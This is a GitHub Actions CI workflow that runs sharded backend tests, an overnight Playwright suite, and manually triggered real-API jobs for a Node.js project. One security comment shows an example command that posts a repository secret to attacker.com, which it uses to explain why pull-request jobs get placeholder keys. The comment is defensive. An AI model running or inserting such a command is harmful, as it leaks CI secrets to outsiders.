name: QA Tests (Phase 1-28)

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  workflow_dispatch:

jobs:
  # O-79 (2026-10): this job had not completed since 2026-05-22. Root cause:
  # tests/setup/testDb.js pinned mongod 6.0.0, which mongodb-memory-server
  # maps to the ubuntu2004 build on Ubuntu >= 21; that binary needs
  # libcrypto.so.1.1 (OpenSSL 1.1), absent on ubuntu-latest (24.04). Every
  # test file failed to start Mongo, then waited out Mongoose's 10 s buffering
  # per query, and the job hit its 15-minute timeout ("The operation was
  # canceled" — it was NOT cancelled by the E2E job). Fixed by running mongod
  # 7.0.24 (ubuntu2204 / OpenSSL 3 build, cached below).
  #
  # The suite is sharded: ~360 files, and Jest under --experimental-vm-modules
  # retains every test file's module graph (~65 MB per file that imports the
  # app), so one process OOMs. Each shard runs in ONE recycled worker
  # (--maxWorkers=1 --workerIdleMemoryLimit) — same isolation as --runInBand,
  # bounded memory. The whole suite took ~39 min in one local process
  # (2026-10-22), so 6 shards keep each job well inside its 30-min timeout.
  # Locally: `npm run test:all` or `npm run test:shard -- 2/6`.
  backend:
    name: Backend Integration + Unit Tests (shard ${{ matrix.shard }}/6)
    runs-on: ubuntu-latest
    timeout-minutes: 30
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3, 4, 5, 6]
    env:
      MONGOMS_VERSION: '7.0.24'

    steps:
      - uses: actions/checkout@v4

      - name: Use Node.js 22
        uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'npm'

      - name: Install dependencies (npm workspaces)
        run: npm ci

      - name: Cache mongod binary
        uses: actions/cache@v4
        with:
          path: ~/.cache/mongodb-binaries
          key: mongodb-binaries-${{ runner.os }}-${{ env.MONGOMS_VERSION }}

      - name: Run integration + unit suites (shard ${{ matrix.shard }}/6)
        # SECURITY: do NOT pass real OPENAI_API_KEY / RESEND_API_KEY here.
        # This job triggers on `pull_request`, so a malicious branch from a
        # collaborator could modify the workflow to exfiltrate the secrets via
        # `curl attacker.com -d "${{ secrets.X }}"`. Integration tests mock
        # external services — placeholder values are sufficient.
        # Real API calls are gated to the `workflow_dispatch`-only jobs below.
        env:
          NODE_ENV: test
          EMAIL_TEST_MODE: 'true'
          SKIP_RATE_LIMIT: 'true'
          JWT_SECRET: ci-jwt-secret-32-characters-minimum-1234567890
          JWT_REFRESH_SECRET: ci-jwt-refresh-32-characters-minimum-12345
          OPENAI_API_KEY: sk-ci-placeholder-not-real
          RESEND_API_KEY: re_ci_placeholder_not_real
          # The upload routes pick their storage at boot from these, and the
          # SDK-mocked upload tests expect the "Cloudinary configured" mode.
          # CLOUDINARY_PLACEHOLDER makes tests/helpers/cloudinary.helper.js
          # skip the tests that need the real dev account (they run locally).
          CLOUDINARY_CLOUD_NAME: ci-placeholder-cloud
          CLOUDINARY_API_KEY: '000000000000000'
          CLOUDINARY_API_SECRET: ci-placeholder-not-real
          CLOUDINARY_PLACEHOLDER: 'true'
        run: |
          cd backend
          node --experimental-vm-modules ../node_modules/jest/bin/jest.js --ci \
            --shard=${{ matrix.shard }}/6 \
            --maxWorkers=1 --workerIdleMemoryLimit=1536MB \
            --testPathPattern='integration/|unit/'

  frontend-e2e-overnight:
    name: Frontend E2E (overnight suite, real backend)
    runs-on: ubuntu-latest
    # Phase 28: replaced the Phase 14 mocked-API job with the real-backend
    # overnight suite. Phase 14 specs were pure theater (e.g., login.spec.ts
    # only checked "page renders SOMETHING"); overnight covers the same
    # flows with real Express + mongodb-memory-server + real Chromium and
    # asserts substantive properties (no info-leak on unknown email,
    # token verification on happy path, suspended/banned semantics, etc.).
    # A full local run with this job's env took 28.6 min (2026-10-22) — 30
    # left no headroom. 2026-10-24 the job reached test 688/904 at 45 min
    # (failures + retries are slow); 75 covers the suite plus the separate
    # production-mode step.
    timeout-minutes: 75

    steps:
      - uses: actions/checkout@v4

      - name: Use Node.js 22
        uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Install Playwright Chromium
        run: npx playwright install --with-deps chromium

      - name: Cache mongod binary
        uses: actions/cache@v4
        with:
          path: ~/.cache/mongodb-binaries
          key: mongodb-binaries-${{ runner.os }}-7.0.24

      - name: Run overnight suite (chromium-desktop only)
        # Same security note as backend job: no real OPENAI/RESEND keys here
        # because PR triggers can be modified by collaborators.
        env:
          NODE_ENV: test
          EMAIL_TEST_MODE: 'true'
          SKIP_RATE_LIMIT: 'true'
          JWT_SECRET: ci-jwt-secret-32-characters-minimum-1234567890
          JWT_REFRESH_SECRET: ci-jwt-refresh-32-characters-minimum-12345
          OPENAI_API_KEY: sk-ci-placeholder-not-real
          RESEND_API_KEY: re_ci_placeholder_not_real
          # O-79: same libcrypto.so.1.1 failure as the backend job — the
          # launcher pinned mongod 6.0.0 and never became ready.
          MONGOMS_VERSION: '7.0.24'
          E2E_LAUNCHER_TIMEOUT_MS: '180000'
        run: |
          cd frontend
          npx playwright test -c playwright.overnight.config.ts --reporter=list

      - name: Run production-mode security specs (CORS allowlist + rate limits)
        # The launcher normally boots the backend in development (all origins
        # allowed, limiters skipped), where CSRF / rate-limit defenses cannot be
        # observed. LAUNCHER_NODE_ENV=production makes the overnight config pick
        # only the PROD_MODE_SPECS. Production refuses EMAIL_TEST_MODE=true, and
        # the placeholder Resend key means no mail can actually be sent.
        if: ${{ !cancelled() }}
        env:
          NODE_ENV: test
          JWT_SECRET: ci-jwt-secret-32-characters-minimum-1234567890
          JWT_REFRESH_SECRET: ci-jwt-refresh-32-characters-minimum-12345
          OPENAI_API_KEY: sk-ci-placeholder-not-real
          RESEND_API_KEY: re_ci_placeholder_not_real
          MONGOMS_VERSION: '7.0.24'
          E2E_LAUNCHER_TIMEOUT_MS: '180000'
          LAUNCHER_NODE_ENV: production
          LAUNCHER_SKIP_RATE_LIMIT: 'false'
          LAUNCHER_EMAIL_TEST_MODE: 'false'
        run: |
          cd frontend
          npx playwright test -c playwright.overnight.config.ts --reporter=list

      - name: Upload Playwright report on failure
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: overnight-playwright-report
          path: |
            frontend/playwright-overnight-report/
            frontend/test-results/overnight/
            /tmp/real-e2e-launcher.log
          retention-days: 7

  ai-embeddings:
    name: AI / Embeddings Real OpenAI (Phase 13 — manual trigger)
    runs-on: ubuntu-latest
    if: github.event_name == 'workflow_dispatch'
    timeout-minutes: 10

    steps:
      - uses: actions/checkout@v4

      - name: Use Node.js 22
        uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'npm'

      - run: npm ci

      - name: Phase 13 OpenAI tests (~$0.05 per run)
        env:
          NODE_ENV: test
          EMAIL_TEST_MODE: 'true'
          SKIP_RATE_LIMIT: 'true'
          JWT_SECRET: ci-jwt-secret-32-characters-minimum-1234567890
          JWT_REFRESH_SECRET: ci-jwt-refresh-32-characters-minimum-12345
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
        run: |
          cd backend
          NODE_ENV=test MONGOMS_VERSION=7.0.24 node --experimental-vm-modules ../node_modules/jest/bin/jest.js --runInBand --testPathPattern='phase-13/'

  smoke:
    name: Phase 0 Smoke (Resend live send — manual trigger)
    runs-on: ubuntu-latest
    if: github.event_name == 'workflow_dispatch'
    timeout-minutes: 5

    steps:
      - uses: actions/checkout@v4

      - name: Use Node.js 22
        uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'npm'

      - run: npm ci

      - name: Smoke (sends 1 real email to test inbox)
        env:
          NODE_ENV: test
          EMAIL_TEST_MODE: 'true'
          RESEND_API_KEY: ${{ secrets.RESEND_API_KEY }}
          JWT_SECRET: ci-jwt-secret-32-characters-minimum-1234567890
        run: |
          cd backend
          NODE_ENV=test node --experimental-vm-modules ../node_modules/jest/bin/jest.js --runInBand --testPathPattern='smoke/'
